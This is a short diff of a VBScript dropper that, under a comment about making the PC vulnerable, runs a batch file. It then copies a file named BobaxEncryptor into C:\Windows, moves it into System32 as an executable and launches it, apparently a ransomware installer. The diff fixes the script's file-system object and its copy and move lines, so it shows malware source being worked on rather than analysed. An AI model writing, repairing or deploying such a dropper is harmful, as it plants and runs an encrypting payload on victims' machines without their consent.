@@ -1,5 +1,7 @@
 DIM FSO, MyFile
 Set oShell = CreateObject( "WScript.Shell" )
+Set FSO = CreateObject("Scripting.FileSystemObject")
+
 
 
 ''' Make the PC vunerable
@@ -13,8 +15,8 @@ CreateObject("Wscript.Shell").Run """file.bat""", 1, True
 
 
 
-FSO.CopyFile "BobaxEncryptor.txt", "C:\Windows\"
-fso.MoveFolder "C:\Windows\BobaxEncryptor.txt", "C:\Windows\System32\BobaxEncryptor.exe"
+FSO.CopyFile "BobaxEncryptor.txt","C:\Windows\"
+FSO.MoveFolder "C:\Windows\BobaxEncryptor.txt","C:\Windows\System32\BobaxEncryptor.exe"
 CreateObject("Wscript.Shell").Run """C:\Windows\System32\BobaxEncryptor.exe""", 1, True
 
 
